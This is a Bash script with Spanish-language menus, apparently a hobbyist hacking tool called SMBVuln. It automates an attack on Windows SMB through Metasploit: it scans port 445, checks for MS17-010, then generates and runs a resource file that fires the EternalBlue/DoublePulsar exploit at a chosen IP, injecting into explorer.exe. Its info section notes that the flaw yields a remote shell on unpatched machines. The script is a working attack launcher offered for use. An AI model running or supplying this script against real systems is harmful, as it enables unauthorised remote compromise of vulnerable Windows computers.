#!/bin/bash

#Colors
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
nc="\e[0m"



#opciones menu

a="Verificar puerto 445"
b="Verificar VULN SMB MS17 010"
c="Explotar un equipo"
d="Informacion de ataque"
e="Salir"

if [[ $EUID -ne 0 ]]; then	
echo -e "$red(ERROR)$blue nesesita root para ejecutar$nc"				  
echo -e "$red(ERROR)$blue you need root for ejecute$nc"          		
exit 1
fi



case `dpkg --print-architecture` in
aarch64)
echo -e "$red(error)$blue el script solo soporta arquitectura$red AMD 64$blue Sistemas debian y deribados [$red✗$nc]"
exit
;;
arm)
echo -e "$red(error)$blue el script solo soporta arquitectura$red AMD 64$blue Sistemas debian y deribados [$red✗$nc]"
exit
;;
armhf)
echo -e "$red(error)$blue el script solo soporta arquitectura$red AMD 64$blue Sistemas debian y deribados [$red✗$nc]"
exit
;;

i*86)
echo -e "$red(error)$blue el script solo soporta arquitectura$red AMD 64$blue Sistemas debian y deribados [$red✗$nc]"
exit
;;
x86_64)
echo -e "$red(error)$blue el script solo soporta arquitectura$red AMD 64$blue Sistemas debian y deribados [$red✗$nc]"
exit
;;
esac

clear
if which msfconsole >/dev/null; then
sleep 1
echo -e "$blue(Metasploit)$nc ................................................... Instalado [$green✓$nc]"
sleep 1
else
sleep 0.25
echo -e "$red(Metasploit)$nc  No instalado [$red✗$nc]"
sleep 1
echo "Instala escribiendo [sudo apt-get install metasploit-framework] o ejecuta el instalador ./install.sh"
exit 1
fi

if which nmap >/dev/null; then
sleep 1
echo -e "$blue(nmap)$nc ................................................... Instalado [$green✓$nc]"
sleep 1
else
sleep 0.25
echo -e "$red(nmap)$nc  No instalado [$red✗$nc]"
sleep 1
echo "Instala escribiendo [sudo apt-get install nmap -y]."
exit 1
fi

if which ruby >/dev/null; then
sleep 1
echo -e "$blue(ruby)$nc ................................................... Instalado [$green✓$nc]"
sleep 1
else
sleep 0.25
echo -e "$red(ruby)$nc  No instalado [$red✗$nc]"
sleep 1
echo "Instala escribiendo [sudo apt-get install ruby -y]."
exit 1
fi

if which cowsay >/dev/null; then
sleep 1
echo -e "$blue(cowsay)$nc ................................................... Instalado [$green✓$nc]"
sleep 1
else
sleep 0.25
echo -e "$red(cowsay)$nc  No instalado [$red✗$nc]"
sleep 1
echo "Instala escribiendo [sudo apt-get install cowsay -y]."
exit 1
fi


#directory verification
directory=$(pwd)

if [ -e $directory/check_smb.rc ]
then
    rm $directory/check_smb.rc

 fi
 
 if [ -e $directory/exploit.rc ]
then
    rm $directory/exploit.rc

 fi


clear 
sleep 2
cowsay -f eyes "SMBVuln Created by facu salgado" | lolcat
sleep 2
echo -e "$purple(*)$blue Created by$red Facu Salgado$blue"
sleep 1

export PS3=$'\e[01;35m(*)\e[01;32m Elige una Opcion:\e[01;33m '

function menuprincipal(){
echo
echo
select menu in "$a" "$b" "$c" "$d" "$e";
do
case $menu in
$a)
sleep 1
printf "\e[01;32mIngresa la IP (local) del objetivo:\e[01;31m " 
read target
echo -e "$purple(*)$blue Escanearemos el puerto$red 445$blue en el equipo$red $target $nc"
nmap $target -p 445
echo -e "$purple(*)$blue Fin del analisis.."
sleep 2
echo -e "$purple(*)$blue Recuerde que si el puerto se encuentra cerrado, no es posible la explotacion"
sleep 5
echo -e "$purple(*)$blue Volviendo al menu principal.."
menuprincipal
;;

$b)
sleep 1
printf "\e[01;32mIngresa la IP (local) del objetivo:\e[01;31m " 
read target
echo -e "$purple(*)$blue Iniciando analisis con Metasploit.."
sleep 2
if [ -e $directory/check_smb.rc ]
then
rm $directory/check_smb.rc
fi
echo "
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS $target
run
exit 
" >> $directory/check_smb.rc
msfconsole -r $directory/check_smb.rc
echo -e "$purple(*)$blue EL analisis fue completado.."
sleep 2
echo -e "$purple(*)$blue Si en el analisis no le indico ningun mensaje que es vulnerable.. entonces no lo es.."
sleep 4
rm $directory/check_smb.rc
echo -e "$purple(*)$blue Volviendo al menu principal.."
sleep 2
menuprincipal

;;

$c)

printf "\e[01;32mIngresa la IP (local) del objetivo:\e[01;31m " 
read target
printf "\e[01;32mIngresa la arquitectura\e[01;34m (x86 o x64):\e[01;31m " 
read bits
if [ -e $directory/exploit.rc ]
then
rm $directory/exploit.rc
fi
echo "
use exploit/windows/smb/eternalblue_doublepulsar
set PROCESSINJECT explorer.exe
set TARGETARCHITECTURE $bits
set RHOSTS $target
run
" >> $directory/exploit.rc
echo -e "$purple(*)$blue Lanzando exploit.."
sleep 3
msfconsole -r $directory/exploit.rc
;;

$d)
clear
echo -e "$purple(*)$red SMB$blue Es un protocolo de comunicacion en$blue Windows"
sleep 4
echo -e "$purple(*)$blue en$red SMB$blue Existe una vulnerabilidad conocida como$red SMB MS17 010"
sleep 4
echo -e "$purple(*)$blue el cual consiste en$red ejecucion remota de codigo$blue en el puerto$red 445"
sleep 4
echo -e "$purple(*)$blue esto nos permite explotar el sistema dentro de la red y obtener una shell"
sleep 4
echo -e "$purple(*)$blue este fallo fue arreglado en las ultimos parches de Windows en 2017"
sleep 4
echo -e "$purple(*)$blue sin embargo hay equipos que aun siguen siendo vulnerables al fallo"
sleep 4
echo -e "$purple(*)$blue especialmente en equipos windows 7 (x86/x64) y en las primeras versiones de W10"
sleep 4
echo -e "$purple(*)$blue Volviendo al menu principal..."
menuprincipal
;;

$e)
sleep 2
echo -e "$purple(*)$blue Saliendo del programa.. Created by$red Facu Salgado$nc"
sleep 3
exit
;;

*)

echo -e "$red(*) Error:#$blue $REPLY$red no es una opcion valida$blue"
;;
esac
done


}
menuprincipal
